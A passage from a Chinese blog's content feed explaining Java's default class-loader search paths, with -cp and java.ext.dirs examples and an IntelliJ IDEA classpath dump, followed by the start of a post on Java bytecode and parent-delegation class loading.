file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/lib/jsse.jar file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/lib/jce.jar file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/lib/charsets.jar file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/lib/jfr.jar file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/classes 可以看到第一行添加了当前路径下的lib文件夹\nTips 可以添加.class文件目录 可以添加.yml、.xml、.properties（或其它配置文件）文件目录 可以添加.jar文件 不可以添加.jar文件所在目录 Extension Class Loader java -Djava.ext.dirs=...即可添加 -Djava.ext.dirs 示例 需要使用System.out.println(System.getProperty(\u0026quot;java.ext.dirs\u0026quot;))来输出，观察变化\n1 2 3 System.out.println(\u0026#34;ExtClassLoader LoadPath: \u0026#34;); System.out.println(System.getProperty(\u0026#34;java.ext.dirs\u0026#34;)); System.out.println(\u0026#34;----------------------------\u0026#34;); 省略无关部分，结果如下\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 cmd\u0026gt;java.exe MainTest # 默认结果 C:\\Windows\\Sun\\Java\\lib\\ext 不存在该目录 sun.misc.Launcher$ExtClassLoader@15db9742 ExtClassLoader LoadPath: D:\\Program Files\\Java\\jdk1.8.0_181\\jre\\lib\\ext;C:\\Windows\\Sun\\Java\\lib\\ext cmd\u0026gt;java.exe -Djava.ext.dirs=.\\test MainTest # 设置后的结果，只剩下了设置目录 sun.misc.Launcher$ExtClassLoader@15db9742 ExtClassLoader LoadPath: .\\test cmd\u0026gt;java.exe -Djava.ext.dirs=\u0026#34;%JAVA_HOME%jre\\lib\\ext;.\\target\u0026#34; MainTest # 推荐设置结果，包含了默认结果中的重要部分和自定义部分 sun.misc.Launcher$ExtClassLoader@15db9742 ExtClassLoader LoadPath: D:\\Program Files\\Java\\jdk1.8.0_181\\jre\\lib\\ext;.\\target 对栗子的解释\n-Djava.ext.dirs=\u0026quot;%JAVA_HOME%jre\\lib\\ext;.\\target\u0026quot;加引号是因为%JAVA_HOME%包含空格。 尽量将java自带的lib\\ext目录带上，即%JAVA_HOME%jre\\lib\\ext。否则，在用其下.jar时，会发生错误。如果确定不需要其下.jar时，则不用加上java自带的lib\\ext目录。 缺少java自带的lib\\ext目录时，java.security包不能使用（NoSuchAlgorithmException）。 Tips 不可以添加.class文件目录 不可以添加.jar文件 可以添加.jar文件所在目录 推荐将java自带的lib\\ext目录带上 Application Class Loader java -classpath ... java -cp ... 注：java -cp ... 是 java -classpath ... 的简写\n-classpath 示例 省略无关部分，结果如下 在这篇文章中也有用到\n1 2 3 4 5 6 7 8 9 10 11 cmd\u0026gt;java.exe -cp .\\ttttest MainTest # 因为-cp参数被覆盖，默认有当前路径 . 但是覆盖后只有 .\\ttttest ，不在当前路径就找不到字节码文件，所以报错 错误: 找不到或无法加载主类 MainTest cmd\u0026gt;java.exe -cp .;.\\ttttest MainTest # 多个路径以;符号为分隔，.表示当前路径，添加后报错解除 sun.misc.Launcher$AppClassLoader@73d16e93 AppClassLoader LoadPath: file:/C:/Users/Dan/Desktop/ppppppp/ file:/C:/Users/Dan/Desktop/ppppppp/ttttest ---------------------------- 可以看到最后一行添加了ttttest文件夹\n如果参数为.\\ttttest;.则结果为\n1 2 3 4 5 6 cmd\u0026gt;java.exe -cp .\\ttttest;. MainTest sun.misc.Launcher$AppClassLoader@73d16e93 AppClassLoader LoadPath: file:/C:/Users/Dan/Desktop/ppppppp/ttttest file:/C:/Users/Dan/Desktop/ppppppp/ ---------------------------- 可以看到第一行添加了ttttest文件夹\nTips 鸡粒推荐！！加入当前文件路径\n可以添加.class文件目录\n可以添加.jar文件\n不可以添加.jar文件所在目录\n可以通配符* java -cp target\\* test.Test target\\*是个特例，可以让java自动搜索其下的.jar文件，并加载。\nIDEA 结果一探 将代码放入IDEA进行执行，会发现结果不同\nIDEA结果如下\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 BootstrapClassLoader LoadPath: file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/lib/resources.jar file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/lib/rt.jar file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/lib/sunrsasign.jar file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/lib/jsse.jar file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/lib/jce.jar file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/lib/charsets.jar file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/lib/jfr.jar file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/classes ---------------------------- sun.misc.Launcher$ExtClassLoader@3eb07fd3 ExtClassLoader LoadPath: file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/lib/ext/access-bridge-64.jar file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/lib/ext/cldrdata.jar file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/lib/ext/dnsns.jar file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/lib/ext/jaccess.jar file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/lib/ext/jfxrt.jar file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/lib/ext/localedata.jar file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/lib/ext/nashorn.jar file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/lib/ext/sunec.jar file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/lib/ext/sunjce_provider.jar file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/lib/ext/sunmscapi.jar file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/lib/ext/sunpkcs11.jar file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/lib/ext/zipfs.jar ---------------------------- sun.misc.Launcher$AppClassLoader@18b4aac2 AppClassLoader LoadPath: file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/lib/charsets.jar file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/lib/deploy.jar file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/lib/ext/access-bridge-64.jar file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/lib/ext/cldrdata.jar file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/lib/ext/dnsns.jar file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/lib/ext/jaccess.jar file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/lib/ext/jfxrt.jar file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/lib/ext/localedata.jar file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/lib/ext/nashorn.jar file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/lib/ext/sunec.jar file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/lib/ext/sunjce_provider.jar file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/lib/ext/sunmscapi.jar file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/lib/ext/sunpkcs11.jar file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/lib/ext/zipfs.jar file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/lib/javaws.jar file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/lib/jce.jar file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/lib/jfr.jar file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/lib/jfxswt.jar file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/lib/jsse.jar file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/lib/management-agent.jar file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/lib/plugin.jar file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/lib/resources.jar file:/D:/Program%20Files/Java/jdk1.8.0_181/jre/lib/rt.jar file:/D:/Users/Dan/Code/Java/Empty/target/classes/ file:/C:/Users/Dan/.m2/repository/org/reflections/reflections/0.9.9/reflections-0.9.9.jar file:/C:/Users/Dan/.m2/repository/com/google/guava/guava/15.0/guava-15.0.jar file:/C:/Users/Dan/.m2/repository/com/google/code/findbugs/annotations/2.0.1/annotations-2.0.1.jar file:/C:/Users/Dan/.m2/repository/org/jboss/shrinkwrap/resolver/shrinkwrap-resolver-api/2.2.6/shrinkwrap-resolver-api-2.2.6.jar file:/C:/Users/Dan/.m2/repository/org/jboss/shrinkwrap/resolver/shrinkwrap-resolver-spi/2.2.6/shrinkwrap-resolver-spi-2.2.6.jar file:/C:/Users/Dan/.m2/repository/org/jboss/shrinkwrap/resolver/shrinkwrap-resolver-api-maven/2.2.6/shrinkwrap-resolver-api-maven-2.2.6.jar file:/C:/Users/Dan/.m2/repository/org/jboss/shrinkwrap/resolver/shrinkwrap-resolver-spi-maven/2.2.6/shrinkwrap-resolver-spi-maven-2.2.6.jar file:/C:/Users/Dan/.m2/repository/org/jboss/shrinkwrap/resolver/shrinkwrap-resolver-api-maven-archive/2.2.6/shrinkwrap-resolver-api-maven-archive-2.2.6.jar file:/C:/Users/Dan/.m2/repository/org/jboss/shrinkwrap/shrinkwrap-api/1.2.6/shrinkwrap-api-1.2.6.jar file:/C:/Users/Dan/.m2/repository/org/jboss/shrinkwrap/resolver/shrinkwrap-resolver-impl-maven/2.2.6/shrinkwrap-resolver-impl-maven-2.2.6.jar file:/C:/Users/Dan/.m2/repository/org/eclipse/aether/aether-api/1.0.0.v20140518/aether-api-1.0.0.v20140518.jar file:/C:/Users/Dan/.m2/repository/org/eclipse/aether/aether-impl/1.0.0.v20140518/aether-impl-1.0.0.v20140518.jar file:/C:/Users/Dan/.m2/repository/org/eclipse/aether/aether-spi/1.0.0.v20140518/aether-spi-1.0.0.v20140518.jar file:/C:/Users/Dan/.m2/repository/org/eclipse/aether/aether-util/1.0.0.v20140518/aether-util-1.0.0.v20140518.jar file:/C:/Users/Dan/.m2/repository/org/eclipse/aether/aether-connector-basic/1.0.0.v20140518/aether-connector-basic-1.0.0.v20140518.jar file:/C:/Users/Dan/.m2/repository/org/eclipse/aether/aether-transport-wagon/1.0.0.v20140518/aether-transport-wagon-1.0.0.v20140518.jar file:/C:/Users/Dan/.m2/repository/org/apache/maven/maven-aether-provider/3.2.5/maven-aether-provider-3.2.5.jar file:/C:/Users/Dan/.m2/repository/org/apache/maven/maven-model/3.2.5/maven-model-3.2.5.jar file:/C:/Users/Dan/.m2/repository/org/apache/maven/maven-model-builder/3.2.5/maven-model-builder-3.2.5.jar file:/C:/Users/Dan/.m2/repository/org/codehaus/plexus/plexus-component-annotations/1.5.5/plexus-component-annotations-1.5.5.jar file:/C:/Users/Dan/.m2/repository/org/apache/maven/maven-repository-metadata/3.2.5/maven-repository-metadata-3.2.5.jar file:/C:/Users/Dan/.m2/repository/org/apache/maven/maven-settings/3.2.5/maven-settings-3.2.5.jar file:/C:/Users/Dan/.m2/repository/org/apache/maven/maven-settings-builder/3.2.5/maven-settings-builder-3.2.5.jar file:/C:/Users/Dan/.m2/repository/org/codehaus/plexus/plexus-interpolation/1.21/plexus-interpolation-1.21.jar file:/C:/Users/Dan/.m2/repository/org/codehaus/plexus/plexus-utils/3.0.20/plexus-utils-3.0.20.jar file:/C:/Users/Dan/.m2/repository/org/sonatype/plexus/plexus-sec-dispatcher/1.3/plexus-sec-dispatcher-1.3.jar file:/C:/Users/Dan/.m2/repository/org/sonatype/plexus/plexus-cipher/1.4/plexus-cipher-1.4.jar file:/C:/Users/Dan/.m2/repository/org/apache/maven/wagon/wagon-provider-api/2.6/wagon-provider-api-2.6.jar file:/C:/Users/Dan/.m2/repository/org/apache/maven/wagon/wagon-file/2.6/wagon-file-2.6.jar file:/C:/Users/Dan/.m2/repository/org/apache/maven/wagon/wagon-http-lightweight/2.6/wagon-http-lightweight-2.6.jar file:/C:/Users/Dan/.m2/repository/org/apache/maven/wagon/wagon-http-shared/2.6/wagon-http-shared-2.6.jar file:/C:/Users/Dan/.m2/repository/org/jboss/shrinkwrap/resolver/shrinkwrap-resolver-impl-maven-archive/2.2.6/shrinkwrap-resolver-impl-maven-archive-2.2.6.jar file:/C:/Users/Dan/.m2/repository/org/jboss/shrinkwrap/shrinkwrap-impl-base/1.2.6/shrinkwrap-impl-base-1.2.6.jar file:/C:/Users/Dan/.m2/repository/org/jboss/shrinkwrap/shrinkwrap-spi/1.2.6/shrinkwrap-spi-1.2.6.jar file:/C:/Users/Dan/.m2/repository/org/jboss/shrinkwrap/resolver/shrinkwrap-resolver-spi-maven-archive/2.2.6/shrinkwrap-resolver-spi-maven-archive-2.2.6.jar file:/C:/Users/Dan/.m2/repository/org/eclipse/sisu/org.eclipse.sisu.plexus/0.3.0.M1/org.eclipse.sisu.plexus-0.3.0.M1.jar file:/C:/Users/Dan/.m2/repository/org/eclipse/sisu/org.eclipse.sisu.inject/0.3.0.M1/org.eclipse.sisu.inject-0.3.0.M1.jar file:/C:/Users/Dan/.m2/repository/org/codehaus/plexus/plexus-compiler-javac/2.3/plexus-compiler-javac-2.3.jar file:/C:/Users/Dan/.m2/repository/org/codehaus/plexus/plexus-compiler-api/2.3/plexus-compiler-api-2.3.jar file:/C:/Users/Dan/.m2/repository/org/javassist/javassist/3.19.0-GA/javassist-3.19.0-GA.jar file:/C:/Users/Dan/.m2/repository/com/nqzero/permit-reflect/0.3/permit-reflect-0.3.jar file:/C:/Users/Dan/.m2/repository/commons-codec/commons-codec/1.9/commons-codec-1.9.jar file:/C:/Users/Dan/.m2/repository/commons-io/commons-io/2.6/commons-io-2.6.jar file:/C:/Users/Dan/.m2/repository/org/jenkins-ci/main/remoting/2.55/remoting-2.55.jar file:/C:/Users/Dan/.m2/repository/org/jenkins-ci/constant-pool-scanner/1.2/constant-pool-scanner-1.2.jar file:/C:/Users/Dan/.m2/repository/org/jboss/logging/jboss-logging/3.3.0.Final/jboss-logging-3.3.0.Final.jar file:/C:/Users/Dan/.m2/repository/org/jboss/remoting/jboss-remoting/4.0.19.Final/jboss-remoting-4.0.19.Final.jar file:/C:/Users/Dan/.m2/repository/org/jboss/xnio/xnio-api/3.3.4.Final/xnio-api-3.3.4.Final.jar file:/C:/Users/Dan/.m2/repository/org/jboss/jboss-common-core/2.5.0.Final/jboss-common-core-2.5.0.Final.jar file:/C:/Users/Dan/.m2/repository/org/jboss/xnio/xnio-nio/3.3.4.Final/xnio-nio-3.3.4.Final.jar file:/C:/Users/Dan/.m2/repository/org/jboss/sasl/jboss-sasl/1.0.5.Final/jboss-sasl-1.0.5.Final.jar file:/C:/Users/Dan/.m2/repository/org/jboss/remotingjmx/remoting-jmx/2.0.1.Final/remoting-jmx-2.0.1.Final.jar file:/C:/Users/Dan/.m2/repository/org/jboss/logging/jboss-logging-processor/1.2.0.Final/jboss-logging-processor-1.2.0.Final.jar file:/C:/Users/Dan/.m2/repository/org/jboss/jdeparser/jdeparser/1.0.0.Final/jdeparser-1.0.0.Final.jar file:/C:/Users/Dan/.m2/repository/org/jboss/marshalling/jboss-marshalling/1.4.10.Final/jboss-marshalling-1.4.10.Final.jar file:/C:/Users/Dan/.m2/repository/org/jboss/marshalling/jboss-marshalling-river/1.4.10.Final/jboss-marshalling-river-1.4.10.Final.jar file:/C:/Users/Dan/.m2/repository/commons-collections/commons-collections/3.1/commons-collections-3.1.jar file:/C:/Users/Dan/.m2/repository/org/beanshell/bsh/2.0b5/bsh-2.0b5.jar file:/C:/Users/Dan/.m2/repository/commons-beanutils/commons-beanutils/1.9.2/commons-beanutils-1.9.2.jar file:/C:/Users/Dan/.m2/repository/commons-logging/commons-logging/1.1.1/commons-logging-1.1.1.jar file:/C:/Users/Dan/.m2/repository/org/apache/commons/commons-collections4/4.0/commons-collections4-4.0.jar file:/C:/Users/Dan/.m2/repository/org/codehaus/groovy/groovy/2.3.9/groovy-2.3.9.jar file:/C:/Users/Dan/.m2/repository/org/springframework/spring-core/4.1.4.RELEASE/spring-core-4.1.4.RELEASE.jar file:/C:/Users/Dan/.m2/repository/org/springframework/spring-beans/4.1.4.RELEASE/spring-beans-4.1.4.RELEASE.jar file:/C:/Users/Dan/.m2/repository/org/hibernate/hibernate-core/4.3.11.Final/hibernate-core-4.3.11.Final.jar file:/C:/Users/Dan/.m2/repository/org/jboss/logging/jboss-logging-annotations/1.2.0.Beta1/jboss-logging-annotations-1.2.0.Beta1.jar file:/C:/Users/Dan/.m2/repository/org/jboss/spec/javax/transaction/jboss-transaction-api_1.2_spec/1.0.0.Final/jboss-transaction-api_1.2_spec-1.0.0.Final.jar file:/C:/Users/Dan/.m2/repository/dom4j/dom4j/1.6.1/dom4j-1.6.1.jar file:/C:/Users/Dan/.m2/repository/xml-apis/xml-apis/1.0.b2/xml-apis-1.0.b2.jar file:/C:/Users/Dan/.m2/repository/org/hibernate/common/hibernate-commons-annotations/4.0.5.Final/hibernate-commons-annotations-4.0.5.Final.jar file:/C:/Users/Dan/.m2/repository/org/hibernate/javax/persistence/hibernate-jpa-2.1-api/1.0.0.Final/hibernate-jpa-2.1-api-1.0.0.Final.jar file:/C:/Users/Dan/.m2/repository/antlr/antlr/2.7.7/antlr-2.7.7.jar file:/C:/Users/Dan/.m2/repository/org/jboss/jandex/1.1.0.Final/jandex-1.1.0.Final.jar file:/C:/Users/Dan/.m2/repository/org/springframework/spring-aop/4.1.4.RELEASE/spring-aop-4.1.4.RELEASE.jar file:/C:/Users/Dan/.m2/repository/aopalliance/aopalliance/1.0/aopalliance-1.0.jar file:/C:/Users/Dan/.m2/repository/net/sf/json-lib/json-lib/2.4/json-lib-2.4-jdk15.jar file:/C:/Users/Dan/.m2/repository/commons-lang/commons-lang/2.5/commons-lang-2.5.jar file:/C:/Users/Dan/.m2/repository/net/sf/ezmorph/ezmorph/1.0.6/ezmorph-1.0.6.jar file:/C:/Users/Dan/.m2/repository/commons-fileupload/commons-fileupload/1.3/commons-fileupload-1.3.jar file:/C:/Users/Dan/.m2/repository/org/apache/wicket/wicket-util/6.23.0/wicket-util-6.23.0.jar file:/C:/Users/Dan/.m2/repository/com/mchange/c3p0/0.9.5.2/c3p0-0.9.5.2.jar file:/C:/Users/Dan/.m2/repository/com/mchange/mchange-commons-java/0.2.11/mchange-commons-java-0.2.11.jar file:/C:/Users/Dan/.m2/repository/javax/servlet/javax.servlet-api/3.1.0/javax.servlet-api-3.1.0.jar file:/C:/Users/Dan/.m2/repository/org/apache/myfaces/core/myfaces-impl/2.2.9/myfaces-impl-2.2.9.jar file:/C:/Users/Dan/.m2/repository/org/apache/myfaces/core/myfaces-api/2.2.9/myfaces-api-2.2.9.jar file:/C:/Users/Dan/.m2/repository/org/apache/geronimo/specs/geronimo-atinject_1.0_spec/1.0/geronimo-atinject_1.0_spec-1.0.jar file:/C:/Users/Dan/.m2/repository/commons-digester/commons-digester/1.8/commons-digester-1.8.jar file:/C:/Users/Dan/.m2/repository/xalan/xalan/2.7.2/xalan-2.7.2.jar file:/C:/Users/Dan/.m2/repository/xalan/serializer/2.7.2/serializer-2.7.2.jar file:/C:/Users/Dan/.m2/repository/rome/rome/1.0/rome-1.0.jar file:/C:/Users/Dan/.m2/repository/jdom/jdom/1.0/jdom-1.0.jar file:/C:/Users/Dan/.m2/repository/org/python/jython-standalone/2.5.2/jython-standalone-2.5.2.jar file:/C:/Users/Dan/.m2/repository/rhino/js/1.7R2/js-1.7R2.jar file:/C:/Users/Dan/.m2/repository/javassist/javassist/3.12.0.GA/javassist-3.12.0.GA.jar file:/C:/Users/Dan/.m2/repository/org/jboss/weld/weld-core/1.1.33.Final/weld-core-1.1.33.Final.jar file:/C:/Users/Dan/.m2/repository/org/jboss/weld/weld-api/1.1.Final/weld-api-1.1.Final.jar file:/C:/Users/Dan/.m2/repository/org/jboss/weld/weld-spi/1.1.Final/weld-spi-1.1.Final.jar file:/C:/Users/Dan/.m2/repository/javax/annotation/jsr250-api/1.0/jsr250-api-1.0.jar file:/C:/Users/Dan/.m2/repository/org/jboss/spec/javax/interceptor/jboss-interceptors-api_1.1_spec/1.0.0.Beta1/jboss-interceptors-api_1.1_spec-1.0.0.Beta1.jar file:/C:/Users/Dan/.m2/repository/org/slf4j/slf4j-ext/1.7.2/slf4j-ext-1.7.2.jar file:/C:/Users/Dan/.m2/repository/ch/qos/cal10n/cal10n-api/0.7.7/cal10n-api-0.7.7.jar file:/C:/Users/Dan/.m2/repository/org/jboss/interceptor/jboss-interceptor-core/2.0.0.Final/jboss-interceptor-core-2.0.0.Final.jar file:/C:/Users/Dan/.m2/repository/org/jboss/interceptor/jboss-interceptor-spi/2.0.0.Final/jboss-interceptor-spi-2.0.0.Final.jar file:/C:/Users/Dan/.m2/repository/javax/enterprise/cdi-api/1.0-SP1/cdi-api-1.0-SP1.jar file:/C:/Users/Dan/.m2/repository/org/jboss/interceptor/jboss-interceptor-api/1.1/jboss-interceptor-api-1.1.jar file:/C:/Users/Dan/.m2/repository/javax/inject/javax.inject/1/javax.inject-1.jar file:/C:/Users/Dan/.m2/repository/javax/interceptor/javax.interceptor-api/3.1/javax.interceptor-api-3.1.jar file:/C:/Users/Dan/.m2/repository/org/slf4j/slf4j-api/1.7.21/slf4j-api-1.7.21.jar file:/C:/Users/Dan/.m2/repository/org/slf4j/slf4j-jdk14/1.7.21/slf4j-jdk14-1.7.21.jar file:/C:/Users/Dan/.m2/repository/org/clojure/clojure/1.8.0/clojure-1.8.0.jar file:/C:/Users/Dan/.m2/repository/com/vaadin/vaadin-server/7.7.14/vaadin-server-7.7.14.jar file:/C:/Users/Dan/.m2/repository/com/vaadin/vaadin-sass-compiler/0.9.13/vaadin-sass-compiler-0.9.13.jar file:/C:/Users/Dan/.m2/repository/org/w3c/css/sac/1.3/sac-1.3.jar file:/C:/Users/Dan/.m2/repository/com/vaadin/external/flute/flute/1.3.0.gg2/flute-1.3.0.gg2.jar file:/C:/Users/Dan/.m2/repository/com/vaadin/vaadin-shared/7.7.14/vaadin-shared-7.7.14.jar file:/C:/Users/Dan/.m2/repository/org/jsoup/jsoup/1.8.3/jsoup-1.8.3.jar file:/C:/Users/Dan/.m2/repository/org/aspectj/aspectjweaver/1.9.5/aspectjweaver-1.9.5.jar file:/C:/Users/Dan/.m2/repository/org/apache/click/click-nodeps/2.3.0/click-nodeps-2.3.0.jar file:/C:/Users/Dan/.m2/repository/ognl/ognl/2.6.9/ognl-2.6.9.jar file:/C:/Users/Dan/.m2/repository/org/apache/velocity/velocity/1.7/velocity-1.7.jar file:/C:/Users/Dan/.m2/repository/org/mortbay/jasper/apache-el/8.0.27/apache-el-8.0.27.jar file:/D:/Program%20Files/JetBrains/IntelliJ%20IDEA%202024.2.3/lib/idea_rt.jar ---------------------------- 对比图如下：\n发现在AppClassLoader LoadPath这一栏增加了巨量的jar文件，这是怎么回事？\n原因是因为IDEA的启动语句\n1 \u0026#34;D:\\Program Files\\Java\\jdk1.8.0_181\\bin\\java.exe\u0026#34; \u0026#34;-javaagent:D:\\Program Files\\JetBrains\\IntelliJ IDEA 2024.2.3\\lib\\idea_rt.jar=1928:D:\\Program Files\\JetBrains\\IntelliJ IDEA 2024.2.3\\bin\u0026#34; -Dfile.encoding=UTF-8 -classpath \u0026#34;D:\\Program Files\\Java\\jdk1.8.0_181\\jre\\lib\\charsets.jar;......#超级多\u0026#34; com.study.java.MainTest 可以看到，第一个参数是确定启动的java程序全路径，第二个-javaagent参数暂时不做学习\n-Dfile.encoding=UTF-8是做了编码统一，最后就是-classpath指定ClassPath 这个参数后面跟了很多包路径\n所以最后，IDEA只是根据我们的设置去自动配置好了需要执行的命令，不需要我们去手动配置相关环境\n豪用，爱用\nTips 自JDK 1.2以后，JVM采用了委托(delegate)模式来载入class。采用这种设计的原因可以参考： http://java.sun.com/docs/books/tutorial/ext/basics/load.html ExtClassLoader 和 AppClassLoader在JVM启动后，会在JVM中保存一份，并且在程序运行中无法改变其搜索路径。如果想在运行时从其他搜索路径加载类，就要产生新的类加载器。 参考 https://blog.csdn.net/sayyy/article/details/81120749 ！！\n","date":"2024-11-07T16:22:58+08:00","image":"https://d4n-picture-database.oss-cn-beijing.aliyuncs.com/img/image-20241107162525270.png","permalink":"https://d4n-sec.github.io/p/classloaderloadpath/","title":"Java默认类加载器的加载路径"},{"content":"本章深入了解Java字节码以及加载Java字节码的类加载器相关姿势\nJava字节码 Java 在刚刚诞生之时曾经提出过一个非常著名的口号: “一次编写，到处运行（write once，run anywhere）”，这句话充分表达了软件开发人员对冲破平台界限的渴求。“与平台无关”的理想最终实现在操作系统的运用层上: 虚拟机提供商开发了许多可以运行在不同平台上的虚拟机，这些虚拟机都可以载入和执行同一种平台无关的字节码，从而实现了程序的“一次编写到处运行”。\n各种不同平台的虚拟机与所有平台都统一使用的程序存储格式—字节码（ByteCode），因此，可以看出字节码对 Java 生态的重要性。之所以被称为字节码，是因为字节码是由十六进制组成的，而 JVM（Java Virtual Machine）以两个十六进制为一组，即以字节为单位进行读取。在 Java 中使用 javac 命令把源代码编译成字节码文件，一个 .java 源文件从编译成 .class 字节码文件的示例\n由此可见，Java字节码是“与平台无关”的关键点。且要说明的是，只要能生成符合 JVM 字节码规范的文件，都可以认为是Java字节码文件，来源不一定是.java文件或者javac编译生成，python也可以，Golang也行。\n甚至，只要能够在JVM中恢复为一个类的字节序列，也可以称之为Java字节码，例如BCEL码\n后续非特殊情况简称字节码\nJava类加载器 什么是Java类加载器 定义完字节码，还需要了解一个东西，叫做类加载器 - ClassLoader\nJava的ClassLoader是根据字节码加载类的最基础的方法，负责将类的字节码加载到内存中，并将其转换为可执行的Java对象。\nClassLoader会告诉Java虚拟机如何加载这个类。Java默认的 ClassLoader就是根据类名来加载类，这个类名是类完整路径，如java.lang.Runtime\n在Java中，每个类都由类加载器加载，并在运行时被创建为一个Class对象。类加载器负责从文件系统、网络或其他来源中加载类的字节码，并将其转换为可执行的Java对象。类加载器还负责解析类的依赖关系，即加载所需的其他类。\nJava类加载器有哪些 Java虚拟机定义了三个主要的类加载器：\n启动类加载器（Bootstrap Class Loader）：也称为根类加载器，它负责加载Java虚拟机的核心类库，如java.lang.Object等。启动类加载器是虚拟机实现的一部分，它通常是由C++等底层语言实现的，而不是Java实现。 扩展类加载器（Extension Class Loader）：它是用来加载Java扩展类库的类加载器。扩展类库包括javax和java.util等包，它们位于jre/lib/ext目录下。 应用程序类加载器（Application Class Loader）：也称为系统类加载器，它负责加载应用程序的类。它会搜索应用程序的类路径（包括用户定义的类路径和系统类路径），并加载类文件。 除了这三个主要的类加载器，Java还支持自定义类加载器，开发人员可以根据需要实现自己的类加载器。\nJava类加载器做什么 类加载器的工作可以简化为三个步骤：\n加载（Loading）：根据类的全限定名（包括包路径和类名），定位并读取类文件的字节码。\n链接（Linking）：将类的字节码转换为可以在虚拟机中运行的格式。\n链接过程包括三个阶段：\n​\t1）验证（Verification）：验证字节码的正确性和安全性，确保它符合Java虚拟机的规范。\n​\t2）准备（Preparation）：为类的静态变量分配内存，并设置默认的初始值。\n​\t3）解析（Resolution）：将类的符号引用（比如方法和字段的引用）解析为直接引用（内存地址）。\n初始化（Initialization）：执行类的初始化代码，包括静态变量的赋值和静态块的执行。 Java类加载器怎么做 Java类加载器实行的是双亲委派机制\n最上方的ClassLoad是最父类的Loader，目前可以这样理解\n在图中可以明显看出来，在符合Java的推荐标准的情况下，类加载器的继承顺序是\nUser Define ClassLoader -\u0026gt; Application ClassLoader -\u0026gt; Extension ClassLoader -\u0026gt; Bootstrap ClassLoader\n但是加载顺序却不一定，ClassLoader收到加载请求时，会做大致两件事来确定加载顺序\n例如：需要加载类Boy时：\nClassLoaderA查看自身是否已经加载过Boy，如果有直接返回，如果没有，会将请求给到父类ClassLoaderB 如果下一个ClassLoaderB并没有加载或者返回Boy类并结束了，ClassLoaderA会尝试加载Boy ClassLoaderB会做和ClassLoaderA相同的事\n如果结合图来看，再给个完全的栗子：\n假设类Boy没有被加载过，且Boy类字节码被加密，最终只能被User Define ClassLoader解密加载，那么执行流会如下\nUser Define ClassLoader 查看自身是否已经加载过Boy，由于Boy没有被加载过，所以失败，请求给到父类Application ClassLoader Application ClassLoader查看自身是否已经加载过Boy，由于Boy没有被加载过，所以失败，请求给到父类Extension ClassLoader Extension ClassLoader查看自身是否已经加载过Boy，由于Boy没有被加载过，所以失败，请求给到父类Bootstrap ClassLoader Bootstrap ClassLoader查看自身是否已经加载过Boy，由于Boy没有被加载过，所以失败，没有父类，尝试加载，加载失败，因为不是Java虚拟机的核心类，返回 执行流回到Extension ClassLoader，父类没有加载，尝试加载，加载失败，因为Boy类不是Java扩展类，返回 执行流回到Application ClassLoader，父类没有加载，尝试加载，加载失败，Boy类无法识别（因为是用户加密了），返回 执行流回到User Define ClassLoader，父类没有加载，尝试解密并加载，加载成功 双亲委派的优劣 优点 